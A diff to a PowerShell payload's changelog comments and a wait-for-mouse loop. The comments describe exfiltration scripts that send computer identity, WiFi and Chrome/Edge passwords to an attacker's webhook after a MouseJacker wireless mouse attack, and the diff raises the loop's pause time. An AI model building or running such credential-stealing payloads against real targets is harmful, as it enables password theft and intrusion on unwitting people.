@@ -1,14 +1,8 @@
-#09/10/2024: - There are two exfil files available.
-# 1. - pubI.ps1 = (pub)lic Information. Needs to have the Webhook info updated; Will only send computer identification information to the webhook of your choosing.
-# 2. - pubI+P.ps1 (pub)lic Information + (P)asswords. Needs to have the Webhook info updated; Will not only send computer identification information to the webhook but also WiFi and browser (chrome and edge) passwords.
-#09/05/2024: - This will grab just the computer Info and send it to a webhook so you can identify the target
-#I decided to make this specifically for use the NRF24 MouseJacker for 2 reasons:
-#1) You cannot use .js scripts with this mode of attack. - (uI.ps1)
-# AND
-#2) If you detect a jackable mouse in the surrounding area you may not know who the target is and you may want to find out who the target it before grabbing the passwords.
 
-#09/12/2024: Now included in the zip are 2 Wait for Mouse Versions of the original pubI.ps1  (WMpubI.ps1) and pubI+P.ps1 (WMpubI+P.ps1) files.
-
+#REM CHANGES: Compiled by Luciferseamus
+#REM 09/05/2024: - This will grab just the computer Info and send it to a webhook so you can identify the target
+#REM 09/10/2024: - There are now two exfil files to choose from.
+#REM 09/12/2024: - Now included in the zip are now 2 additional Wait for Mouse Versions of the original pubI.ps1  (WMpubI.ps1) and pubI+P.ps1 (WMpubI+P.ps1) files.
 
 #############################################################################################################################################
 
@@ -19,7 +13,7 @@ $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 
     while (1) {
-        $pauseTime = 60
+        $pauseTime = 600
         if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
             break
         }
